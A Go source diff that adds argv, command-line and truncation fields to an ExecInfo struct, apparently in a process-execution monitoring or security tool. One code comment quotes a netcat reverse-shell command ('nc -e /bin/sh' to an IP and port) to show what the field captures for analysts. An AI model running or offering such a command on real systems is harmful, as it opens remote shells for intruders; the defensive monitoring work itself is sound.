@@ -185,6 +185,19 @@ type ExecInfo struct {
 	// AncestryChain renders the same lineage oldest-first for humans and for
 	// log search, e.g. "nginx -> sh -> curl".
 	AncestryChain string `json:"ancestryChain,omitempty"`
+
+	// Args is argv as the caller passed it. It is what separates "nc ran" from
+	// "nc -e /bin/sh 10.0.0.1 4444", and it is the field an analyst reads
+	// first on a denied exec.
+	Args []string `json:"args,omitempty"`
+
+	// CommandLine is the same thing rendered for humans and log search.
+	CommandLine string `json:"commandLine,omitempty"`
+
+	// ArgsTruncated reports that the command line did not fit the kernel's
+	// capture buffer, so Args is a prefix. Reading a truncated line as the
+	// whole invocation is exactly the mistake this prevents.
+	ArgsTruncated bool `json:"argsTruncated,omitempty"`
 }
 
 // AncestorInfo is one link in an exec's process lineage.
